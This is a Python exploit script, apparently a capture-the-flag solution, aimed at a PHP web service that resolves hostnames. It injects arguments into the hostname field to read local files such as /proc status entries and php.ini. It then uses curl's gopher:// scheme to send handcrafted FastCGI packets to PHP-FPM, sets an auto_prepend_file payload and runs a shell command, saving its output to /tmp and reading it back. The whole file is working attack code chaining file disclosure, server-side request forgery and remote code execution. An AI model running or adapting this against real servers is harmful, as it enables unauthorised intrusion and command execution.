#!/usr/bin/env python3.7

import sys
import struct
import requests


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 7702

URL = f'http://{IP}:{PORT}/'


def build_fcgi_packet(params):
    def build_fcgi_data(d):
        data = []
        for k, v in d.items():
            data.append(bytes([len(k), len(v)]) + k.encode() + v.encode())
        return b''.join(data)

    def build_fcgi_record(id_, type_, data):
        return b''.join([
            b'\x01',
            bytes([type_]),
            struct.pack('>HH', id_, len(data)),
            bytes([len(data) % 8]),
            b'\x00',
            data,
            b'\x00' * (len(data) % 8)
        ])

    id_ = 1234

    return b''.join([
        build_fcgi_record(id_, 1, b'\x00\x01\x00\x00\x00\x00\x00\x00'),
        build_fcgi_record(id_, 4, build_fcgi_data(params)),
        build_fcgi_record(id_, 4, build_fcgi_data({}))
    ])


def escape(s):
    return ''.join(f'%{hex(x)[2:].zfill(2)}' for x in s)


def construct_gopher_url(packet):
    return f'gopher://0.0.0.0:31337/X{escape(packet)}'


def read_file(filename):
    hostname = escape(f"@0.0.0.0 -p12345 -f {filename}".encode())
    response = requests.get(URL + f'?hostname={hostname}')
    data = []
    for line in response.text.split('\n'):
        if 'connection refused' in line:
            data.append(line[line.index(' for ')+len(' for '):line.index(' failed: ')])
    return data


def get_ppid(filename):
    data = read_file(filename)
    for i in range(len(data)):
        if data[i] == 'PPid:':
            return data[i + 1]


def curl_request(url, parse=False):
    hostname = escape(f'"{url}"'.encode())
    response = requests.get(URL + f'?usecurl=1&hostname={hostname}')
    html = response.text
    if not parse:
        return html
    lines = html[html.index('<textarea'):html.index('</textarea>') + len('</textarea>')]
    return '\n'.join(lines.split('\n')[1:-1])


def prepare():
    ppid1 = int(get_ppid('/proc/self/status'))
    ppid2 = int(get_ppid('/proc/self/status'))
    print('ppids', ppid1, ppid2, end='\n\n')
    
    parent_ppid = int(get_ppid(f'/proc/{ppid2 + (ppid2 - ppid1)}/status'))
    data = read_file(f'/proc/{parent_ppid}/status')
    print('status', data[:2], end='\n\n')

    print('php.ini', ' '.join(read_file('/etc/php/7.4/fpm/php.ini')), end='\n\n')

    # try index.php as most obvious php filename
    php_filename = '/var/resolver/index.php'

    print('index.php', ' '.join(read_file(php_filename)), end='\n\n')
    print('index.php (curl)', curl_request(f'file://{php_filename}'), end='\n\n')

    return php_filename


def main():
    prepare()

    cmd = "cat /tmp/f*"

    result_filename = '/tmp/kek'
    shell = f'<?php `{cmd} > {result_filename}` ?>'.encode()

    php_filename = '/var/resolver/index.php'

    admin_values = [
        'allow_url_fopen=On',
        'allow_url_include=On',
        f'auto_prepend_file=data:,{escape(shell)}'
    ] * 4 # repeat many times because of many fpm instances

    for admin_value in admin_values:
        params = {
            'REQUEST_METHOD': 'GET',
            'SCRIPT_FILENAME': php_filename,
            'PHP_ADMIN_VALUE': admin_value
        }

        packet = build_fcgi_packet(params)
        url = construct_gopher_url(packet)

        # print('url', url, end='\n\n')

        curl_request(url)
    
    print(curl_request(f'file://{result_filename}', True))


if __name__ == '__main__':
    main()
